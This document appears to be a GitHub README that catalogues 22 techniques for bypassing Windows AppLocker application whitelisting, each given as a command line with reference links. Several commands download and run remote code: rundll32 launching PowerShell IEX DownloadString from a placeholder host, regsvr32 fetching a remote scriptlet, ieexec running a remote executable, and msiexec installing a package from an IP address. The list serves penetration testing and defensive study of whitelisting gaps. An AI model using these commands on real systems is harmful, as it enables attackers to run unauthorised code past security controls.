# Ultimate AppLocker ByPass List
The goal of this repository is to document the most common techniques to bypass AppLocker. 
This README file contains a complete list of all known bypasses.
Since AppLocker can be configured in different ways it makes sense to have "master" list of bypasses. 

**There are verified lists for EXE and DLL bypasses.**
These bypasses are based on the default rules created with AppLocker
-	[BypassDLL-DefaultRules.MD](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/BypassDLL-DefaultRules.md)
-	[BypassEXE-DefaultRules.MD](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/BypassEXE-DefaultRules.md)

Please contribute and do point out errors or resources I have forgotten.
Remember that bypass techniques for BypassDLL and BypassEXE must be verified.
These list should only contain valid bypasses. 


## 1. Rundll32.exe

rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://ip:port/');"

rundll32 shell32.dll,Control_RunDLL payload.dll

Links:  
https://pentestlab.blog/2017/05/23/applocker-bypass-rundll32/
https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_7


## 2. Regsvr32.exe

regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll

Links:  
https://gist.github.com/subTee/24c7d8e1ff0f5602092f58cbb3f7d302



## 3. Msbuild.exe

msbuild.exe pshell.xml

Links:  
https://gist.github.com/subTee/6b236083da2fd6ddff216e434f257614
http://subt0x10.blogspot.no/2017/04/bypassing-application-whitelisting.html
https://github.com/Cn33liz/MSBuildShell
https://github.com/Cn33liz/MS17-012
https://pentestlab.blog/2017/05/29/applocker-bypass-msbuild/
https://www.youtube.com/watch?v=aSDEAPXaz28



## 4. Regsvcs.exe

regsvcs.exe /U regsvcs.dll
regsvcs.exe regsvcs.dll

Links:  
https://pentestlab.blog/2017/05/19/applocker-bypass-regasm-and-regsvcs/
https://gist.githubusercontent.com/subTee/fb09ef511e592e6f7993/raw/e9b28e7955a5646672267a61e9685fc5a4ab5f2a/regsvcs.cs



## 5. Regasm.exe

regasm.exe /U regsvcs.dll
regasm.exe regsvcs.dll

Links:  
https://pentestlab.blog/2017/05/19/applocker-bypass-regasm-and-regsvcs/
https://gist.githubusercontent.com/subTee/fb09ef511e592e6f7993/raw/e9b28e7955a5646672267a61e9685fc5a4ab5f2a/regsvcs.cs



## 6. Bginfo.exe

bginfo.exe bginfo.bgi /popup /nolicprompt

Links:  
https://msitpros.com/?p=3831
https://pentestlab.blog/2017/06/05/applocker-bypass-bginfo/
https://msitpros.com/?p=3860



## 7. InstallUtil.exe

InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll

Links:  
https://github.com/subTee/AllTheThings
https://pentestlab.blog/2017/05/08/applocker-bypass-installutil/
https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_12



## 8. MSDT.exe

Open .diagcab package

Links:  
https://cybersyndicates.com/2015/10/a-no-bull-guide-to-malicious-windows-trouble-shooting-packs-and-application-whitelist-bypass/



## 9. mshta.exe

mshta.exe evilfile.hta

Links:  
https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_4



## 10. Execute .Bat

cmd.exe /k < script.txt

Links:  
https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_3



## 11. Execute .PS1

Get-Content script.txt | iex

Links:  
https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_3



## 12. Execute .VBS

cscript.exe //E:vbscript script.txt

Links:  
https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_3



## 13. PresentationHost.exe

Missing Example

Links:  
https://raw.githubusercontent.com/subTee/ShmooCon-2015/master/ShmooCon-2015-Simple-WLEvasion.pdf



## 14. dfsvc.exe

Missing Example

Links:  
https://raw.githubusercontent.com/subTee/ShmooCon-2015/master/ShmooCon-2015-Simple-WLEvasion.pdf



## 15. IEExec.exe

ieexec.exe http://x.x.x.x:8080/bypass.exe

Links:  
https://room362.com/post/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/



## 16. cdb.exe

cdb.exe -cf x64_calc.wds -o notepad.exe

Links:  
http://www.exploit-monday.com/2016/08/windbg-cdb-shellcode-runner.html


## 17. dnx.exe

dnx.exe consoleapp

Links:  
https://enigma0x3.net/2016/11/17/bypassing-application-whitelisting-by-using-dnx-exe/



## 18. rcsi.exe

rcsi.exe bypass.csx

Links:  
https://enigma0x3.net/2016/11/21/bypassing-application-whitelisting-by-using-rcsi-exe/



## 19. csi.exe

Missing example

Links:  
https://web.archive.org/web/20161008143428/http://subt0x10.blogspot.com/2016/09/application-whitelisting-bypass-csiexe.html



## 20. CPL loading location manipulation

Control.exe

Links:  
https://pentestlab.blog/2017/05/24/applocker-bypass-control-panel/
https://www.contextis.com/resources/blog/applocker-bypass-registry-key-manipulation/



## 21. msxsl.exe

msxsl.exe customers.xml script.xsl

Links:  
https://pentestlab.blog/2017/07/06/applocker-bypass-msxsl/
https://gist.github.com/subTee/d9380299ff35738723cb44f230ab39a1



## 22. msiexec.exe

msiexec /quiet /i cmd.msi
msiexec /q /i http://192.168.100.3/tmp/cmd.png

Links:  
https://pentestlab.blog/2017/06/16/applocker-bypass-msiexec/
